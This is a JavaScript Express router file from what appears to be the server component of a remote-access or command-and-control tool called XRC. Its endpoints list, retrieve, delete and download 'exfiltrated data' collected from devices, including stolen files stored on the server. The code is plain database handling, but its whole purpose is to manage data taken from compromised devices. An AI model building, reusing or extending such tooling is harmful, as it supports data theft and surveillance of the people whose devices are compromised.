// ============================================================
// FILE: XRC/server/src/routes/exfil.js
// ============================================================
const express = require('express');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const { getDatabase } = require('../db/database');

const router = express.Router();

/**
 * GET /api/exfil
 * List exfiltrated data with filters.
 */
router.get('/', (req, res) => {
    try {
        const db = getDatabase();
        const { device_id, type, limit, offset } = req.query;

        let query = `
            SELECT e.*, d.alias as device_alias
            FROM exfil_data e
            LEFT JOIN devices d ON e.device_id = d.device_id
            WHERE 1=1
        `;
        const params = [];

        if (device_id) { query += ' AND e.device_id = ?'; params.push(device_id); }
        if (type) { query += ' AND e.type = ?'; params.push(type); }

        query += ' ORDER BY e.received_at DESC';

        const countQuery = query.replace('SELECT e.*, d.alias as device_alias', 'SELECT COUNT(*) as count');
        const total = db.prepare(countQuery).get(...params);

        const pageLimit = parseInt(limit) || 50;
        const pageOffset = parseInt(offset) || 0;
        query += ` LIMIT ${pageLimit} OFFSET ${pageOffset}`;

        const data = db.prepare(query).all(...params);

        res.json({
            data,
            total: total.count,
            limit: pageLimit,
            offset: pageOffset
        });
    } catch (err) {
        console.error('List exfil error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * GET /api/exfil/:id
 * Get specific exfil data item.
 */
router.get('/:id', (req, res) => {
    try {
        const db = getDatabase();
        const item = db.prepare(`
            SELECT e.*, d.alias as device_alias, d.model
            FROM exfil_data e
            LEFT JOIN devices d ON e.device_id = d.device_id
            WHERE e.id = ?
        `).get(req.params.id);

        if (!item) {
            return res.status(404).json({ error: 'Exfil data not found' });
        }

        res.json(item);
    } catch (err) {
        console.error('Get exfil error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * DELETE /api/exfil/:id
 * Delete exfil data item.
 */
router.delete('/:id', (req, res) => {
    try {
        const db = getDatabase();
        const item = db.prepare('SELECT * FROM exfil_data WHERE id = ?').get(req.params.id);

        if (!item) {
            return res.status(404).json({ error: 'Exfil data not found' });
        }

        // Delete file if it exists
        if (item.file_path && fs.existsSync(item.file_path)) {
            fs.unlinkSync(item.file_path);
        }

        db.prepare('DELETE FROM exfil_data WHERE id = ?').run(req.params.id);
        res.json({ message: 'Exfil data deleted' });
    } catch (err) {
        console.error('Delete exfil error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * GET /api/exfil/export/:id
 * Download exfiltrated file.
 */
router.get('/export/:id', (req, res) => {
    try {
        const db = getDatabase();
        const item = db.prepare('SELECT * FROM exfil_data WHERE id = ?').get(req.params.id);

        if (!item) {
            return res.status(404).json({ error: 'Exfil data not found' });
        }

        if (item.file_path && fs.existsSync(item.file_path)) {
            res.download(item.file_path);
        } else if (item.data) {
            res.json({ data: item.data });
        } else {
            res.status(404).json({ error: 'No data available' });
        }
    } catch (err) {
        console.error('Export exfil error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

module.exports = router;
